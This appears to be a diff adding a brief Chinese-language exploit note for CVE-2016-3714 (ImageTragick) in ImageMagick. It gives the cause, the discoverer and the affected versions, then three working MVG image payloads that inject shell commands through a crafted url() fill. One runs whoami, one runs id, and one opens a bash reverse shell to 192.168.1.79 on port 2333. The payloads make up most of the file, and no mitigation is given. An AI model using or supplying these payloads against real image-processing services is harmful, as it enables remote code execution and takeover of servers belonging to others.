@@ -1,0 +1,23 @@
+漏洞编号： CVE-2016-3714
+发现人员： Slack安全工程师Ryan Hube
+漏洞简述： 产生原因是因为字符过滤不严谨所导致的执行代码. 对于文件名传递给后端的命令过滤不足,导致允许多种文件格式转换过程中远程执行代码。
+影响版本： 
+ImageMagick6.5.7-8 2012-08-17
+ImageMagick6.7.7-10 2014-03-06
+低版本至6.9.3-9 released 2016-04-30
+
+
+push graphic-context
+viewbox 0 0 640 480
+fill 'url(https://evalbug.com/"|whoami")'
+pop graphic-context
+
+push graphic-context
+viewbox 0 0 640 480
+fill 'url(https://example.com/1.jpg"|bash -i >& /dev/tcp/192.168.1.79/2333 0>&1")'
+pop graphic-context"
+
+push graphic-context
+viewbox 0 0 640 480
+fill 'url(https://"|id; ")'
+pop graphic-context
